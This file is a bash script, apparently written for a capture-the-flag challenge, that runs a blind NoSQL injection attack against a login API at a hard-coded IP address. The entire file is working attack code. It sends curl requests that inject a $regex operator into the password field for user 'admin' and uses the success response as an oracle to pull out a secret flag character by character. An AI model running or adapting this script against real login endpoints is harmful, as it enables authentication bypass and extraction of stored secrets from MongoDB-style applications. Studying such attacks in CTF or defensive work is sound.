#!/bin/bash

# Blind NoSQL Injection Exploit for CTF Challenge
TARGET="http://46.250.231.233:1339/api/login"

echo "Starting Blind NoSQL Injection Attack..."
echo "Target: $TARGET"
echo ""

# Known flag format: BNCTF{...}
flag=""
position=0

# Characters to test (alphanumeric + special chars commonly in flags)
chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ abcdefghijklmnopqrstuvwxyz0123456789_{}-!@#$%^&*()"

echo "Extracting flag character by character..."

while true; do
    found=false
    
    for (( i=0; i<${#chars}; i++ )); do
        char="${chars:$i:1}"
        # Escape special regex characters for JSON
        escaped_char="$char"
        case "$char" in
            '[') escaped_char='\\[' ;;
            ']') escaped_char='\\]' ;;
            '*') escaped_char='\\*' ;;
            '.') escaped_char='\\.' ;;
            '^') escaped_char='\\^' ;;
            '$') escaped_char='\\$' ;;
            '(') escaped_char='\\(' ;;
            ')') escaped_char='\\)' ;;
            '{') escaped_char='\\{' ;;
            '}') escaped_char='\\}' ;;
            '\\') escaped_char='\\\\' ;;
        esac
        
        # Build regex pattern to test current position
        regex="^${flag}${escaped_char}"
        
        # Make request with regex pattern
        response=$(curl -s -X POST "$TARGET" \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"admin\",\"password\":\"{\\\"\\$regex\\\":\\\"${regex}\\\"}\"}")
        
        # Check if successful (user found)
        if echo "$response" | grep -q '"success":true'; then
            flag="${flag}${char}"
            found=true
            echo -ne "\rCurrent flag: $flag"
            
            # Check if we reached the end (closing brace for BNCTF format)
            if [[ "$char" == "}" ]]; then
                echo ""
                echo ""
                echo "================================"
                echo "FLAG EXTRACTED: $flag"
                echo "================================"
                exit 0
            fi
            break
        fi
    done
    
    # If no character matched, we might be at the end
    if [ "$found" = false ]; then
        echo ""
        echo ""
        echo "================================"
        echo "FLAG EXTRACTED: $flag"
        echo "================================"
        break
    fi
    
    ((position++))
    
    # Safety limit to prevent infinite loops
    if [ $position -gt 100 ]; then
        echo ""
        echo "Reached character limit. Flag so far: $flag"
        break
    fi
done
